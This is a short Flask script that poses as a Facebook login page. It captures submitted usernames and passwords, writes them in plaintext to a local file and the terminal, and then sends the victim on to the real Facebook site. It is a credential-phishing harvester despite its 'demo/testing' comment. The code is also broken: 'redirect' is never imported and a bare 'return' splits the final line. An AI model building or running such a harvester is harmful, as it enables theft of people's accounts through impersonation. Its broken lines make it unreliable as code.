from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('facebook.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Save to file (for demo/testing purpose only)
    with open('credentials.txt', 'a') as f:
        f.write(f"Username: {username}, Password: {password}\n")

    # Also print in terminal
    print(f"[LOG] Username: {username}, Password: {password}")

    return
  redirect("https://www.facebook.com/")

if __name__ == '__main__':
    app.run(debug=True)
